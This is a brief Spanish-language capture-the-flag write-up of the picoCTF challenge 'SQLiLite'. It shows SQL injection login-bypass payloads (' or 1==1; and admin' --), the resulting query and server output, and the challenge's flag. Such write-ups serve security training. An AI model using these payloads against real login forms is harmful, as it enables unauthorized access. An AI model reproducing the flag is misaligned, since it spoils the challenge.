# SQLiLite

## Objetivos
Can you login to this website?


## Solución 
```bash
SELECT * FROM users WHERE name='admin' AND password='' or 1==1;'

```
``` php
<pre>username: admin
password: &#039; or 1==1;
SQL query: SELECT * FROM users WHERE name=&#039;admin&#039; AND password=&#039;&#039; or 1==1;&#039;
</pre><h1>Logged in! But can you see the flag, it is in plainsight.</h1><p hidden>Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_9b0a4e21}</p>

```

## Notas adicionales 
ponemos como contraseña: ` ' or 1==1;' `
y listo nos podemos logear

otra forma sería logearnos como user name = admin' --